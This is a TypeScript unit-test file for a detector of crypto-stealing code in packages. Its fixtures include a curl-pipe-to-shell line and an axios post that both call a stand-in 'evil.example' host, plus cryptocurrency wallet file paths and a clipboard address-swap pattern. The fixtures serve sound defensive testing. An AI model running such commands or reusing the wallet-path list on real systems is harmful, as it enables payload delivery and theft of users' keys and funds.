// Unit tests for the §6 detection library. One positive + one negative per category, plus the
// combination check for the clipboard swap. End-to-end coverage via analyzeManifest lives in
// `static-analysis.spec.ts`.

import { Severity } from '../models/enums';
import { findClipboardSwap, scan } from './web3-signatures';

function names(text: string): Set<string> {
  return new Set(scan(text).map((h) => h.name));
}

function byName(text: string): Record<string, ReturnType<typeof scan>[number]> {
  const out: Record<string, ReturnType<typeof scan>[number]> = {};
  for (const h of scan(text)) out[h.name] = h;
  return out;
}

// --- SECOND_PAYLOAD -----------------------------------------------------------------------------

test('curl|sh fires at CRITICAL', () => {
  const hits = byName('curl http://evil.example/payload.sh | sh');
  expect(hits.curl_pipe_sh).toBeDefined();
  expect(hits.curl_pipe_sh.severity).toBe(Severity.CRITICAL);
});

test('node -e and eval fire', () => {
  expect(names('node -e "require(\'http\')…"').has('node_dash_e')).toBe(true);
  expect(names('eval(decoded);').has('eval_call')).toBe(true);
});

test('Function() constructor fires', () => {
  expect(names("new Function('return process')()").has('function_constructor')).toBe(true);
  expect(names("Function('return 1')()").has('function_constructor')).toBe(true);
});

test('long base64 blob is obfuscation MEDIUM, not crypto_theft', () => {
  const blob = 'A'.repeat(220);
  const hit = byName(`const x = '${blob}';`).base64_blob;
  expect(hit).toBeDefined();
  expect(hit.category).toBe('obfuscation');
  expect(hit.severity).toBe(Severity.MEDIUM);
});

test('hex-escape blob fires', () => {
  const payload = '\\x41'.repeat(40);
  expect(names(`const x = "${payload}";`).has('hex_escape_blob')).toBe(true);
});

// --- WALLET_PATHS -------------------------------------------------------------------------------

test('Solana keypair fires at CRITICAL', () => {
  const hits = byName("const p = path.join(os.homedir(), '.config/solana/id.json');");
  expect(hits.solana_keypair).toBeDefined();
  expect(hits.solana_keypair.severity).toBe(Severity.CRITICAL);
});

test('other wallet paths fire', () => {
  const text = `
    const a = 'wallet.dat';
    const b = '/home/u/keystore/UTC--';
    const c = 'MetaMask';
    const d = 'Phantom wallet export';
    const e = 'Library/Application Support/Electrum/wallets';
    const f = 'Ledger Live';
    const g = 'Exodus';
  `;
  const found = names(text);
  for (const expected of [
    'wallet_dat',
    'keystore_dir',
    'metamask',
    'phantom',
    'electrum',
    'ledger_live',
    'exodus',
  ]) {
    expect(found.has(expected)).toBe(true);
  }
});

// --- SEED_OR_KEY (hint-gated) -------------------------------------------------------------------

test('BIP-39 without hint does not fire', () => {
  const prose = 'the quick brown fox jumps over the lazy dog and then sleeps under the tree';
  expect(names(prose).has('bip39_mnemonic')).toBe(false);
});

test('BIP-39 with hint fires at HIGH', () => {
  const text =
    '// store the mnemonic for later\n' +
    "const seed = 'abandon ability able about above absent absorb abstract absurd abuse access accident';";
  const hits = byName(text);
  expect(hits.bip39_mnemonic).toBeDefined();
  expect(hits.bip39_mnemonic.severity).toBe(Severity.HIGH);
});

test('hex privkey requires a hint', () => {
  const bare = "const x = '0x" + 'ab'.repeat(32) + "';";
  expect(names(bare).has('hex_privkey')).toBe(false);
  const withHint = '// privateKey export\n' + bare;
  expect(names(withHint).has('hex_privkey')).toBe(true);
});

test('PEM privkey fires without hint', () => {
  const text = 'const k = `-----BEGIN RSA PRIVATE KEY-----\nMIIEvg…`;';
  expect(names(text).has('pem_privkey')).toBe(true);
});

// --- CLIPBOARD_SWAP (combination check) ---------------------------------------------------------

test('clipboard lib alone does not fire the swap', () => {
  expect(
    findClipboardSwap("const c = require('clipboardy'); c.writeSync('hello');"),
  ).toBeNull();
});

test('address alone does not fire the swap', () => {
  expect(findClipboardSwap('// our donation address is 0x' + 'ab'.repeat(20))).toBeNull();
});

test('clipboard + address combo fires at HIGH', () => {
  const text =
    "const clipboard = require('clipboardy');\n" +
    "clipboard.write('0x" +
    'ab'.repeat(20) +
    "');\n";
  const hit = findClipboardSwap(text);
  expect(hit).not.toBeNull();
  expect(hit!.category).toBe('crypto_theft');
  expect(hit!.severity).toBe(Severity.HIGH);
  expect(names(text).has('clipboard_swap')).toBe(true);
});

// --- EXFIL --------------------------------------------------------------------------------------

test('outbound HTTP to external host fires', () => {
  expect(names("axios.post('https://evil.example/c2', payload);").has('outbound_http')).toBe(true);
});

test('outbound HTTP to localhost does not fire', () => {
  expect(names("axios.post('http://localhost:3000/ping', payload);").has('outbound_http')).toBe(false);
});

// --- Sanity -------------------------------------------------------------------------------------

test('clean source returns no hits', () => {
  const text = `
    'use strict';
    function add(a, b) { return a + b; }
    module.exports = { add };
  `;
  expect(scan(text)).toEqual([]);
});
